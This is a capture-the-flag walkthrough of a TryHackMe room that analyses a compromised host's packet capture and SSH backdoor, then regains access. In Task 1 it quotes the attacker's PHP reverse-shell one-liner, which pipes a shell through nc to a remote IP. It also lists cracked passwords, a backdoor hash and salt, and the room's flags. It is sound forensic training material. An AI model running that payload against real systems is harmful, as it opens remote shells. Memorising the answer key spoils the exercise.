# Overpass2- Hacked Challenge Report
## Introduction
This challenge involves network traffic dump captured from a compromised network.
The goal is to analyse the pcap file to identify how the attacker got into the network
and check for persistence. After that we hack our way back into the machine to get
the flags. The challenge also involves password cracking and source code analysis for
malware analysis.

Let’s get going...

## Walkthrough
## Task 1: Forensics- Analyse the PCAP
Question: What was the URL of the page they used to upload a reverse
shell?
Answer: /development/
To view uploaded data we use thefollowing filter in wireshark
http.request.method=POST
<URL used to upload the reverse the shell>

Question: What payload did the attacker use to gain access?
Answer: <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc
192.168.170.145 4242 >/tmp/f")?>
<Reverse shell payload used by attacker>

Question: What password did the attacker use to privesc?
Answer: whenevernoteartinstant
To get the answer, we filter for http traffic using the filter http and analyze the
filtered results.
<Password used by attacker for privilege escalation>

Question: How did the attacker establish persistence?
Answer: https://github.com/NinjaJc01/ssh-backdoor
<Backdoor used by attacker for persistence>

Question: Using the fasttrack wordlist, how many of the system
passwords were crackable?
Answer: 4

## Task 2: Research- Analyse the code
To analyze the source code, we visit the backdoor payload github page that we
discovered in the pcap file, https://github.com/NinjaJc01/ssh-backdoor
Question: What's the default hash for the backdoor?
Answer:
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bf
ccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
<Default hash for the backdoor>

Question: What's the hardcoded salt for the backdoor?
Answer: 1c362db832f3f864c8c2fe05f2002a05
<Hard coded salt for the backdoor>

Question: What was the hash that the attacker used?- go back to the
PCAP for this!
Answer:
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e37
0b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
<Hash used by the attacker>

Question: Crack the hash using rockyou and a cracking tool of your
choice. What's the password?
Answer: november16

## Task 3: Attack- Get back in
Question: The attacker defaced the website. What message did they
leave as a heading?
Answer: H4ck3d by CooctusClan
<Defaced website>
Question: Using the information you've found previously, hack your way
back in!
Answer: No answer needed.
Question: What's the user flag?
Answer: thm{d119b4fa8c497ddb0525f7ad200e6567}
<User flag>
Question: What's the root flag?
Answer: thm{d53b2684f169360bb9606c333873144d}
<Root flag>
Module completion
TryHackMe Profile Link: https://tryhackme.com/p/kl45h
<Did this module and completed a while ago>
Conclusion
Learned a couple of new things. One, analyzing malware and network for IOCs
collection which can be used for defense in IDS/IPS systems. Two cracking password
hashes with JohnTheRipper and hashcat.
This was a good learning experience as this knowledge can be used during Digital
Forensics and Incident Response.
